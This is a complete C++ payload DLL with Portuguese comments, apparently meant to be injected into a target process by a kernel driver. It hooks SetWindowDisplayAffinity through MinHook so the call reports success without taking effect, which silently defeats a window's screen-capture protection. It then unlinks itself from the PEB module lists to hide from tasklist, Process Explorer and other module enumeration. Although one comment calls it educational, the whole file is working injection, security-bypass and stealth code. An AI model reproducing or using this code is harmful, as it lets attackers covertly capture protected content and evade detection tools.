// affbypass.cpp
// DLL de payload real: hookeia user32!SetWindowDisplayAffinity via MinHook.
// Quando carregada dentro do processo alvo (via APC do driver), o hook faz
// com que qualquer chamada subsequente a SetWindowDisplayAffinity retorne
// TRUE sem repassar ao Windows/DWM — a janela do alvo "acha" que esta
// protegida, mas o compositor nunca e notificado.
//
// Prova visual: apos a injecao, "Snipping Tool" captura o conteudo real da
// janela mesmo quando o alvo clica em "Proteger" repetidamente.
#include <windows.h>
#include <cstdio>
#include <intrin.h>
#include "MinHook.h"

// ---- PEB / Ldr structs (subset — apenas o que usamos p/ unlink) ----
// Layout estavel em Win7..Win11. Definimos AFF_UNICODE_STRING inline pra
// nao depender de <winternl.h> (que traz outras structs conflitantes).
typedef struct _AFF_UNICODE_STRING {
    USHORT Length;
    USHORT MaximumLength;
    PWSTR  Buffer;
} AFF_UNICODE_STRING, *PAFF_UNICODE_STRING;

typedef struct _AFF_PEB_LDR_DATA {
    ULONG      Length;
    BOOLEAN    Initialized;
    HANDLE     SsHandle;
    LIST_ENTRY InLoadOrderModuleList;
    LIST_ENTRY InMemoryOrderModuleList;
    LIST_ENTRY InInitializationOrderModuleList;
} AFF_PEB_LDR_DATA, *PAFF_PEB_LDR_DATA;

typedef struct _AFF_LDR_ENTRY {
    LIST_ENTRY         InLoadOrderLinks;
    LIST_ENTRY         InMemoryOrderLinks;
    LIST_ENTRY         InInitializationOrderLinks;
    PVOID              DllBase;
    PVOID              EntryPoint;
    ULONG              SizeOfImage;
    AFF_UNICODE_STRING FullDllName;
    AFF_UNICODE_STRING BaseDllName;
} AFF_LDR_ENTRY, *PAFF_LDR_ENTRY;

typedef struct _AFF_PEB {
    BYTE                  Reserved1[0x18];
    PAFF_PEB_LDR_DATA     Ldr;
    // ... resto omitido
} AFF_PEB, *PAFF_PEB;

#pragma comment(lib, "user32.lib")

namespace {

// Assinatura do alvo (user32!SetWindowDisplayAffinity).
using PFN_SetWindowDisplayAffinity = BOOL (WINAPI*)(HWND, DWORD);
PFN_SetWindowDisplayAffinity g_origSet = nullptr;

// Contador de invocacoes — util pra provar que o hook engajou.
volatile LONG g_calls = 0;

// Nosso hook: aceita silenciosamente qualquer pedido, retorna TRUE sem chamar
// o original. Do lado do processo alvo tudo parece normal; o kernel/DWM nao
// recebem a mudanca de afinidade.
// Forward decl (definida abaixo).
static void writeStatusFile(const wchar_t* status);

BOOL WINAPI Hook_SetWindowDisplayAffinity(HWND hwnd, DWORD affinity) {
    InterlockedIncrement(&g_calls);
    wchar_t log[128];
    wsprintfW(log,
              L"affbypass: SetWindowDisplayAffinity(hwnd=0x%p, aff=0x%X) NEUTRALIZADO",
              hwnd, affinity);
    OutputDebugStringW(log);
    // Atualiza o arquivo de status a cada chamada — o contador reflete o
    // numero real de intercepcoes, pronto pra `type %TEMP%\affbypass_status.txt`.
    writeStatusFile(L"ativo (interceptando)");
    return TRUE; // finge sucesso, nao repassa
}

// Escreve arquivo curto em %TEMP% provando que a DLL engajou o hook.
void writeStatusFile(const wchar_t* status) {
    wchar_t path[MAX_PATH];
    DWORD n = GetTempPathW(MAX_PATH, path);
    if (n == 0 || n >= MAX_PATH - 32) return;
    lstrcatW(path, L"affbypass_status.txt");
    HANDLE h = CreateFileW(path, GENERIC_WRITE, 0, nullptr,
                           CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, nullptr);
    if (h == INVALID_HANDLE_VALUE) return;
    SYSTEMTIME st; GetLocalTime(&st);
    char line[512];
    // status vem em WCHAR — converte pra ANSI so pro arquivo.
    char statusA[128] = {0};
    WideCharToMultiByte(CP_ACP, 0, status, -1, statusA, sizeof(statusA), nullptr, nullptr);
    int len = wsprintfA(line,
        "affbypass %s\r\nPID: %u\r\nHora: %04u-%02u-%02u %02u:%02u:%02u\r\n"
        "Chamadas ate agora: %ld\r\n",
        statusA, GetCurrentProcessId(),
        st.wYear, st.wMonth, st.wDay, st.wHour, st.wMinute, st.wSecond,
        g_calls);
    DWORD w = 0;
    WriteFile(h, line, (DWORD)len, &w, nullptr);
    CloseHandle(h);
}

// Remove uma LIST_ENTRY das tres listas do PEB Ldr — a DLL some do
// Toolhelp32Snapshot(SNAPMODULE) e do EnumProcessModules. Nao remove do
// LdrpHashTable/LdrpModuleBaseAddressIndex (usados internamente pelo loader
// e por algumas rotinas de resolucao) — pra completar stealth precisaria disso,
// mas pra o objetivo educacional/anti-tasklist basico, unlink das 3 basta.
void hidePeb(HINSTANCE hInst) {
    // PEB em x64: TEB[0x60]. TEB e apontado por GS:[0x30].
    // Como estamos no processo alvo, __readgsqword funciona.
    PAFF_PEB peb = (PAFF_PEB)__readgsqword(0x60);
    if (!peb || !peb->Ldr) return;

    PLIST_ENTRY head = &peb->Ldr->InLoadOrderModuleList;
    PLIST_ENTRY cur  = head->Flink;
    while (cur && cur != head) {
        PAFF_LDR_ENTRY e = CONTAINING_RECORD(cur, AFF_LDR_ENTRY, InLoadOrderLinks);
        if (e->DllBase == (PVOID)hInst) {
            // Remove das 3 listas (LIST_ENTRY.Flink/Blink em cada).
            auto unlink = [](PLIST_ENTRY le) {
                le->Blink->Flink = le->Flink;
                le->Flink->Blink = le->Blink;
                le->Flink = le;
                le->Blink = le;
            };
            unlink(&e->InLoadOrderLinks);
            unlink(&e->InMemoryOrderLinks);
            unlink(&e->InInitializationOrderLinks);
            OutputDebugStringW(L"affbypass: PEB unlink OK (invisivel pra Toolhelp)");
            return;
        }
        cur = cur->Flink;
    }
    OutputDebugStringW(L"affbypass: PEB unlink FALHOU (entry nao encontrada)");
}

bool installHook() {
    if (MH_Initialize() != MH_OK) return false;

    HMODULE user32 = GetModuleHandleW(L"user32.dll");
    if (!user32) return false;

    FARPROC target = GetProcAddress(user32, "SetWindowDisplayAffinity");
    if (!target) return false;

    if (MH_CreateHook(target, &Hook_SetWindowDisplayAffinity,
                      reinterpret_cast<LPVOID*>(&g_origSet)) != MH_OK) {
        return false;
    }
    if (MH_EnableHook(target) != MH_OK) return false;
    return true;
}

} // namespace

BOOL WINAPI DllMain(HINSTANCE hInst, DWORD reason, LPVOID /*reserved*/) {
    if (reason == DLL_PROCESS_ATTACH) {
        DisableThreadLibraryCalls(hInst);
        bool ok = installHook();
        writeStatusFile(ok ? L"engajado (hook instalado)" : L"FALHOU a instalar hook");
        OutputDebugStringW(ok ? L"affbypass: hook engajado" : L"affbypass: hook FALHOU");
        // Feature 3: some das listas de modulos do PEB.
        // Fica INVISIVEL pra tasklist /m, Process Explorer, Toolhelp,
        // EnumProcessModules. LoadLibraryW ja terminou; unlink e seguro agora.
        hidePeb(hInst);
    }
    return TRUE;
}
